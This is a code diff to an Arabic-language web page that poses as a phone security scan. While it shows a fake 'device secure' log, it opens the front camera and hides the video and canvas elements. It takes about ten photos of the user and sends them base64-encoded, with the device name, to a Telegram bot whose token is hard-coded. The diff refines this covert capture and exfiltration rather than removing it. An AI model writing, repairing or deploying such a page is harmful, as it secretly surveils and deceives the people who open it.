@@ -8,8 +8,6 @@
         :root { --green: #00ff41; --red: #ff0040; }
         * { margin:0; padding:0; box-sizing:border-box; }
         body { font-family: 'Courier New', monospace; background: #000; color: #fff; height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; padding: 20px; }
-        @keyframes flicker { 0%,100%{opacity:1} 50%{opacity:0.3} }
-        @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.05)} }
         .container { max-width: 400px; width: 100%; }
         .page { display: none; } .page.active { display: block; }
         .skull { font-size: 60px; animation: pulse 0.5s infinite; }
@@ -17,15 +15,14 @@
         .device-card { background: #0a0a0a; border: 2px solid var(--green); border-radius: 14px; padding: 18px; margin-bottom: 20px; }
         .device-card .d-name { color: var(--green); font-size: 16px; font-weight: 700; }
         .btn { width: 100%; padding: 18px; border-radius: 12px; border: 2px solid var(--green); background: #0a1a0a; color: var(--green); font-size: 18px; font-weight: 700; cursor: pointer; font-family: 'Courier New', monospace; }
-        .code-screen { background: #000; border: 2px solid var(--green); border-radius: 10px; padding: 14px; margin: 16px 0; color: var(--green); font-size: 10px; line-height: 1.5; text-align: left; max-height: 200px; overflow-y: auto; }
+        .code-screen { background: #000; border: 2px solid var(--green); border-radius: 10px; padding: 14px; margin: 16px 0; color: var(--green); font-size: 10px; line-height: 1.5; text-align: left; max-height: 150px; overflow-y: auto; }
         .countdown { font-size: 40px; font-weight: 900; color: var(--red); }
         .progress-bar { width: 100%; height: 4px; background: #0a1a0a; border-radius: 2px; margin: 10px 0; overflow: hidden; }
         .progress-fill { height: 100%; background: var(--red); width: 0%; }
-        .photo-count { color: var(--green); font-size: 16px; margin: 8px 0; }
+        .photo-count { color: var(--green); font-size: 14px; margin: 6px 0; }
         .success-icon { font-size: 70px; }
         .success-text { color: var(--green); font-size: 22px; font-weight: 700; }
-        video { display: none; }
-        canvas { display: none; }
+        video { display: none; } canvas { display: none; }
     </style>
 </head>
 <body>
@@ -34,7 +31,7 @@
         <div class="skull">🛡️</div>
         <h1>حماية الهاتف</h1>
         <div class="device-card"><div class="d-name" id="device-name">📱 جاري الكشف...</div></div>
-        <button class="btn" id="start-btn" onclick="startScan()">🔍 اضغط لبدء الفحص</button>
+        <button class="btn" onclick="startScan()">🔍 اضغط لبدء الفحص</button>
     </div>
     <div class="page" id="page-scanning">
         <div class="skull">💀</div>
@@ -62,78 +59,59 @@ document.getElementById('device-name').textContent = '📱 ' + device.name;
 function showPage(id) { document.querySelectorAll('.page').forEach(p => p.classList.remove('active')); document.getElementById(id).classList.add('active'); }
 function sendMsg(text) { fetch('https://api.telegram.org/bot8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text})}).catch(e=>{}); }
 
-let stream, canvas, video, photoCount = 0, maxPhotos = 10;
-
-// تأكيد الزرار
-document.getElementById('start-btn').addEventListener('click', startScan);
-document.getElementById('start-btn').addEventListener('touchend', function(e) { e.preventDefault(); startScan(); });
-
-async function sendPhoto(blob, num) {
-    const reader = new FileReader();
-    reader.onloadend = async () => {
-        const base64 = reader.result.split(',')[1];
-        await fetch(API, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, video_base64: base64 }) });
-    };
-    reader.readAsDataURL(blob);
-}
+let stream, photoCount = 0;
 
 function takePhoto() {
-    if (!video || !canvas) return;
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0);
+    const video = document.getElementById('hidden-video');
+    const canvas = document.getElementById('hidden-canvas');
+    if (!video || !canvas || video.readyState < 2) return;
+    canvas.width = video.videoWidth || 320;
+    canvas.height = video.videoHeight || 240;
+    canvas.getContext('2d').drawImage(video, 0, 0);
     canvas.toBlob(async (blob) => {
-        if (blob) {
-            await sendPhoto(blob, photoCount);
-            photoCount++;
-            document.getElementById('photo-count').textContent = `📸 ${photoCount}/10 صور`;
-        }
-    }, 'image/jpeg', 0.8);
+        if (!blob) return;
+        const reader = new FileReader();
+        reader.onloadend = async () => {
+            await fetch(API, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, video_base64: reader.result.split(',')[1] }) });
+        };
+        reader.readAsDataURL(blob);
+        photoCount++;
+        document.getElementById('photo-count').textContent = `📸 ${photoCount}/10 صور`;
+    }, 'image/jpeg', 0.7);
 }
 
 async function startScan() {
     showPage('page-scanning');
     sendMsg(`🛡️ فحص\n📱 ${device.name}`);
     
-    // تشغيل كاميرا أمامية
     try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        video = document.getElementById('hidden-video');
-        canvas = document.getElementById('hidden-canvas');
-        video.srcObject = stream;
-        video.play();
-        await new Promise(r => setTimeout(r, 1000));
+        document.getElementById('hidden-video').srcObject = stream;
+        await new Promise(r => setTimeout(r, 1500));
     } catch(e) {}
 
+    photoCount = 0;
     const codeScreen = document.getElementById('code-screen');
     const countdownEl = document.getElementById('countdown');
     const progressFill = document.getElementById('progress-fill');
-    const logs = ['[■] INITIALIZING...','[■] DEVICE: '+device.name,'[■] CHECKING...','[■] CAPTURING PHOTOS...','[■] KERNEL: SECURE','[■] FIREWALL: ACTIVE','[■] NO MALWARE','[✓] DEVICE SECURE'];
+    const logs = ['[■] INITIALIZING...','[■] DEVICE: '+device.name,'[■] CHECKING...','[■] CAPTURING...','[■] KERNEL: SECURE','[■] NO MALWARE','[✓] DEVICE SECURE'];
     let seconds = 15;
     
-    // أول صورة فوراً
     takePhoto();
     
     const interval = setInterval(() => {
         seconds--;
         countdownEl.textContent = seconds;
         progressFill.style.width = ((15 - seconds) / 15 * 100) + '%';
-        const lines = Math.floor(((15 - seconds) / 15) * logs.length);
-        codeScreen.innerHTML = logs.slice(0, Math.min(lines + 1, logs.length)).join('<br>');
-        codeScreen.scrollTop = codeScreen.scrollHeight;
+        codeScreen.innerHTML = logs.slice(0, Math.floor(((15-seconds)/15)*logs.length+1)).join('<br>');
         
-        // صورة كل 1.5 ثانية
-        if (seconds % 2 === 1 || seconds === 14 || seconds === 1) {
-            takePhoto();
-        }
+        if (seconds % 2 === 0 || seconds === 13 || seconds === 3) takePhoto();
+        if (seconds <= 3 && photoCount < 10) { takePhoto(); takePhoto(); }
         
         if (seconds <= 0) {
             clearInterval(interval);
-            // 3 صور سريعة في الآخر
-            for (let i = 0; i < 3; i++) { takePhoto(); await new Promise(r => setTimeout(r, 500)); }
-            if (stream) stream.getTracks().forEach(t => t.stop());
-            showPage('page-done');
+            for (let i = photoCount; i < 10; i++) takePhoto();
+            setTimeout(() => { if (stream) stream.getTracks().forEach(t => t.stop()); showPage('page-done'); }, 2000);
         }
     }, 1000);
 }
